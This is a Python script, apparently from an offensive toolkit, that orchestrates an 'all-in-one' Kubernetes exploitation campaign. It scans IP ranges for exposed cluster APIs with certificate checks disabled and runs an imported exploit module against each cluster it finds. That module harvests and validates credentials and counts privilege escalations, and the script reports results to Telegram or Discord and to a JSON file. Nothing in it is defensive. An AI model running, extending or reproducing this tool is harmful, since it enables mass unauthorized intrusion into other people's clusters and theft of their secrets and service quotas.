#!/usr/bin/env python3
"""
🚀 AIO K8s Exploit - Intégration complète avec framework existant
Author: wKayaa
Date: 2025-06-23 22:28:51 UTC
"""

import asyncio
import sys
from pathlib import Path

# Import de votre framework existant
from kubernetes_advanced import (
    KubernetesAdvancedExploitation,
    ExploitationConfig,
    ExploitationMode
)

# Import du nouveau module
from k8s_exploit_master import K8sExploitMaster

class AIOKubernetesExploit:
    """Intégration All-In-One de tous les modules"""
    
    def __init__(self, config: ExploitationConfig = None,
                 telegram_token: str = None, telegram_chat_id: str = None,
                 discord_webhook: str = None):
        
        # Configuration par défaut
        if not config:
            config = ExploitationConfig(
                mode=ExploitationMode.AGGRESSIVE,
                max_concurrent_clusters=50,
                timeout_per_operation=15
            )
        
        # Framework de base (votre existant)
        self.base_framework = KubernetesAdvancedExploitation(config)
        
        # Module avancé (nouveau)
        self.exploit_master = K8sExploitMaster(
            telegram_token=telegram_token,
            telegram_chat_id=telegram_chat_id,
            discord_webhook=discord_webhook
        )
        
        # Statistiques consolidées
        self.consolidated_stats = {
            "session_id": self.exploit_master.session_id,
            "frameworks_used": ["base", "exploit_master"],
            "total_clusters_found": 0,
            "total_credentials_validated": 0,
            "total_privilege_escalations": 0
        }

    async def run_complete_exploitation(self, targets: list):
        """Exécute l'exploitation complète avec tous les modules"""
        
        print(f"🚀 AIO K8s Exploit - Session: {self.exploit_master.session_id}")
        print(f"🎯 Targets: {len(targets)}")
        print(f"⚡ Frameworks: Base + Exploit Master")
        
        # Phase 1: Scan rapide avec framework de base
        print("\n🔍 Phase 1: Scan rapide des clusters")
        base_results = await self._run_base_framework_scan(targets)
        
        # Phase 2: Exploitation avancée des clusters trouvés
        print("\n🚀 Phase 2: Exploitation avancée")
        advanced_results = await self._run_advanced_exploitation(base_results)
        
        # Phase 3: Consolidation et rapport
        print("\n📊 Phase 3: Consolidation des résultats")
        final_report = await self._consolidate_results(base_results, advanced_results)
        
        return final_report

    async def _run_base_framework_scan(self, targets):
        """Utilise votre framework existant pour le scan initial"""
        
        # Expansion des cibles
        expanded_targets = self.base_framework.expand_targets(targets)
        
        # Scan parallèle avec votre framework
        discovered_clusters = []
        
        import aiohttp
        async with aiohttp.ClientSession() as session:
            tasks = []
            semaphore = asyncio.Semaphore(self.base_framework.config.max_concurrent_clusters)
            
            for target in expanded_targets:
                task = self._scan_target_base(session, target, semaphore)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, str):  # URL de cluster trouvé
                    discovered_clusters.append(result)
        
        self.consolidated_stats["total_clusters_found"] = len(discovered_clusters)
        print(f"✅ Phase 1 terminée: {len(discovered_clusters)} clusters découverts")
        
        return discovered_clusters

    async def _scan_target_base(self, session, target, semaphore):
        """Scan d'une cible avec le framework de base"""
        async with semaphore:
            ports = [6443, 8443, 10250, 8080, 443, 80]
            
            for port in ports:
                for protocol in ['https', 'http']:
                    try:
                        url = f"{protocol}://{target}:{port}"
                        
                        async with session.get(url, ssl=False, timeout=5) as response:
                            if response.status in [200, 401, 403]:
                                # Vérifier si c'est vraiment un cluster K8s
                                if await self._verify_kubernetes_cluster(session, url):
                                    return url
                                    
                    except Exception:
                        continue
        
        return None

    async def _verify_kubernetes_cluster(self, session, base_url):
        """Vérifie si l'URL correspond à un cluster Kubernetes"""
        k8s_indicators = [
            "/api/v1",
            "/apis",
            "/version",
            "/.well-known/openid_configuration"
        ]
        
        for endpoint in k8s_indicators:
            try:
                async with session.get(f"{base_url}{endpoint}", 
                                     ssl=False, timeout=3) as response:
                    if response.status in [200, 401, 403]:
                        response_text = await response.text()
                        if any(keyword in response_text.lower() 
                               for keyword in ['kubernetes', 'api', 'version']):
                            return True
            except Exception:
                continue
        
        return False

    async def _run_advanced_exploitation(self, cluster_urls):
        """Lance l'exploitation avancée sur les clusters trouvés"""
        
        if not cluster_urls:
            print("❌ Aucun cluster à exploiter")
            return []
        
        # Utiliser le module avancé pour l'exploitation
        advanced_results = []
        
        for cluster_url in cluster_urls:
            try:
                print(f"🎯 Exploitation avancée: {cluster_url}")
                result = await self.exploit_master.exploit_cluster_complete(cluster_url)
                advanced_results.append(result)
                
                # Mise à jour des stats
                validated_creds = len([c for c in result.credentials_found if c.validated])
                self.consolidated_stats["total_credentials_validated"] += validated_creds
                
                if result.escalation_pods:
                    self.consolidated_stats["total_privilege_escalations"] += len(result.escalation_pods)
                
            except Exception as e:
                print(f"❌ Erreur exploitation {cluster_url}: {str(e)}")
        
        return advanced_results

    async def _consolidate_results(self, base_results, advanced_results):
        """Consolide les résultats des deux frameworks"""
        
        consolidation = {
            "session_info": {
                "session_id": self.consolidated_stats["session_id"],
                "frameworks_used": self.consolidated_stats["frameworks_used"],
                "execution_time": str(self.exploit_master.start_time),
            },
            "discovery_phase": {
                "targets_scanned": self.base_framework.stats.get("ips_scanned", 0),
                "clusters_discovered": len(base_results),
                "cluster_urls": base_results
            },
            "exploitation_phase": {
                "clusters_exploited": len([r for r in advanced_results if r.status == 'exploited']),
                "total_credentials_found": sum(len(r.credentials_found) for r in advanced_results),
                "validated_credentials": self.consolidated_stats["total_credentials_validated"],
                "privilege_escalations": self.consolidated_stats["total_privilege_escalations"]
            },
            "detailed_results": []
        }
        
        # Résultats détaillés par cluster
        for result in advanced_results:
            if result.status == 'exploited':
                cluster_detail = {
                    "cluster_endpoint": result.cluster_endpoint,
                    "vulnerable_pods": len(result.vulnerable_pods),
                    "credentials_by_type": {},
                    "validated_services": []
                }
                
                for cred in result.credentials_found:
                    if cred.validated:
                        if cred.type not in cluster_detail["credentials_by_type"]:
                            cluster_detail["credentials_by_type"][cred.type] = 0
                        cluster_detail["credentials_by_type"][cred.type] += 1
                        
                        if cred.validation_result:
                            cluster_detail["validated_services"].append({
                                "service": cred.validation_result.get("service", "Unknown"),
                                "type": cred.type,
                                "quota": cred.validation_result.get("quota", "Unknown")
                            })
                
                consolidation["detailed_results"].append(cluster_detail)
        
        # Affichage du résumé
        print(f"\n📊 RÉSUMÉ FINAL AIO K8s Exploit")
        print(f"═══════════════════════════════════════")
        print(f"🎯 Clusters découverts: {consolidation['discovery_phase']['clusters_discovered']}")
        print(f"⚡ Clusters exploités: {consolidation['exploitation_phase']['clusters_exploited']}")
        print(f"🔑 Credentials validés: {consolidation['exploitation_phase']['validated_credentials']}")
        print(f"🚀 Escalades de privilèges: {consolidation['exploitation_phase']['privilege_escalations']}")
        print(f"💎 Session: {consolidation['session_info']['session_id']}")
        
        # Sauvegarde automatique
        await self._save_consolidation_report(consolidation)
        
        return consolidation

    async def _save_consolidation_report(self, consolidation):
        """Sauvegarde le rapport consolidé"""
        
        import json
        from datetime import datetime
        
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        filename = f"aio_k8s_exploit_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(consolidation, f, indent=2, ensure_ascii=False, default=str)
            
            print(f"💾 Rapport sauvé: {filename}")
            
        except Exception as e:
            print(f"❌ Erreur sauvegarde: {str(e)}")

# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 SCRIPT PRINCIPAL
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    """Point d'entrée principal AIO"""
    
    import argparse
    
    parser = argparse.ArgumentParser(description="🚀 AIO K8s Exploit - All-In-One Framework")
    
    parser.add_argument('--targets', '-t', nargs='+', 
                       help='Cibles (IPs, CIDRs, ou fichier)', required=True)
    parser.add_argument('--telegram-token', help='Token Telegram Bot')
    parser.add_argument('--telegram-chat-id', help='Chat ID Telegram')
    parser.add_argument('--discord-webhook', help='URL webhook Discord')
    parser.add_argument('--mode', choices=['passive', 'active', 'aggressive'],
                       default='aggressive', help='Mode d\'exploitation')
    parser.add_argument('--max-concurrent', type=int, default=50,
                       help='Nombre max de clusters en parallèle')
    
    args = parser.parse_args()
    
    # Chargement des cibles
    targets = []
    for target in args.targets:
        if Path(target).exists():  # Fichier de cibles
            with open(target, 'r') as f:
                file_targets = [line.strip() for line in f 
                              if line.strip() and not line.startswith('#')]
                targets.extend(file_targets)
        else:
            targets.append(target)
    
    if not targets:
        print("❌ Aucune cible spécifiée")
        sys.exit(1)
    
    # Configuration
    config = ExploitationConfig(
        mode=ExploitationMode[args.mode.upper()],
        max_concurrent_clusters=args.max_concurrent,
        timeout_per_operation=15
    )
    
    # Initialisation AIO
    aio_exploit = AIOKubernetesExploit(
        config=config,
        telegram_token=args.telegram_token,
        telegram_chat_id=args.telegram_chat_id,
        discord_webhook=args.discord_webhook
    )
    
    print(f"🚀 AIO K8s Exploit v1.0")
    print(f"🎯 Targets: {len(targets)}")
    print(f"⚡ Mode: {args.mode.upper()}")
    print(f"📱 Notifications: {'✅' if args.telegram_token else '❌'}")
    
    # Exploitation complète
    results = await aio_exploit.run_complete_exploitation(targets)
    
    print(f"\n✅ Exploitation terminée - Session: {results['session_info']['session_id']}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️ Arrêt demandé par l'utilisateur")
    except Exception as e:
        print(f"❌ Erreur fatale: {str(e)}")